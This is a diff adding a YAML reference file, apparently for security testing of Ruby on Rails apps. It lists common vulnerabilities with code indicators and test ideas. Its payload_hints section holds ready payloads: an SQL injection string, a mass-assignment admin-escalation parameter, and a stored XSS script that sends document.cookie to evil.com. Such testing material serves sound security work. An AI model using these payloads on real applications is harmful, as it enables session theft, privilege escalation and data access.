@@ -1,0 +1,101 @@
+tech_name: Ruby on Rails
+
+common_vulns:
+  - vuln_name: Mass Assignment (Strong Parameters Bypass)
+    description: >
+      Prior to Rails 4, attr_accessible/attr_protected controlled mass assignment.
+      In modern Rails, missing permit() on sensitive attributes or using params.permit!
+      allows setting privileged fields via form parameters.
+    indicators:
+      - "params.permit!"
+      - "update_attributes(params[:user])"
+      - "permit(:role)"
+    test_idea: >
+      Submit a PUT/PATCH with role=admin or admin=true in the request body.
+      Check if the change is persisted in the database.
+
+  - vuln_name: SQL Injection via String Interpolation in ActiveRecord
+    description: >
+      Using string interpolation instead of parameterized queries in ActiveRecord
+      where clauses (User.where("name = '#{params[:name]}'")) introduces SQLi.
+    indicators:
+      - "where(\"... #{params"
+      - ".find_by_sql("
+      - "sanitize_sql absent"
+    test_idea: >
+      Inject ' OR 1=1-- into interpolated parameters. Look for all-records responses,
+      errors, or timing differences indicating blind SQLi.
+
+  - vuln_name: YAML Deserialization (CVE-2013-0156)
+    description: >
+      Rails versions before 3.2.11 deserialize request bodies (XML containing YAML)
+      leading to arbitrary object instantiation and RCE. Outdated apps still vulnerable.
+    indicators:
+      - "Rails < 3.2.11"
+      - "Content-Type: application/xml"
+      - "--- !ruby/object"
+    test_idea: >
+      Send a crafted XML body with YAML payload targeting ERB or YAML gadget chains.
+      Modern Rails: test custom YAML.load usage with untrusted input.
+
+  - vuln_name: Devise Authentication Bypass via Email Enumeration
+    description: >
+      Devise's default behavior returns different error messages for non-existent
+      vs. wrong-password accounts, enabling email enumeration.
+    indicators:
+      - "Devise"
+      - "Invalid email or password"
+      - "Email not found"
+    test_idea: >
+      Compare response times and messages for known vs. unknown email addresses
+      in the login endpoint. Enumerate registered users.
+
+  - vuln_name: Unprotected Admin Routes
+    description: >
+      Rails apps using ActiveAdmin or custom admin namespaces without proper
+      authentication middleware expose admin functionality.
+    indicators:
+      - "/admin"
+      - "ActiveAdmin"
+      - "before_action :authenticate_admin! absent"
+    test_idea: >
+      Access /admin, /admin/users, /admin/dashboard without authentication.
+      Test if the before_action filter is applied consistently.
+
+  - vuln_name: IDOR via ActiveRecord ID
+    description: >
+      Sequential numeric IDs in RESTful routes (/users/:id, /orders/:id) without
+      ownership scope checks allow cross-user data access.
+    indicators:
+      - "User.find(params[:id])"
+      - "Order.find_by(id: params[:id])"
+      - "current_user scope absent"
+    test_idea: >
+      Enumerate integer IDs in authenticated endpoints across two accounts.
+      Look for cross-account data leakage.
+
+  - vuln_name: Stored XSS via ERB without html_escape
+    description: >
+      ERB templates using raw() or html_safe on user-controlled content, or
+      <%= without explicit sanitization, allow stored XSS injection.
+    indicators:
+      - "raw(user.bio)"
+      - ".html_safe"
+      - "<%="
+    test_idea: >
+      Store <script>alert(1)</script> in user-controlled fields rendered by
+      templates using raw() or html_safe. Verify script execution in other users' browsers.
+
+misconfigurations:
+  - config.secret_key_base hardcoded or weak
+  - force_ssl not enabled in production.rb
+  - config.log_level = :debug in production
+  - Session store using cookie store with weak secret
+  - protect_from_forgery disabled for API controllers
+
+payload_hints:
+  sqli: "' OR '1'='1' -- -"
+  mass_assignment: "user[role]=admin&user[admin]=true"
+  xss_stored: "<script>document.location='https://evil.com/'+document.cookie</script>"
+  admin_path: "/admin/users"
+  idor_test: "/api/v1/users/2/orders"
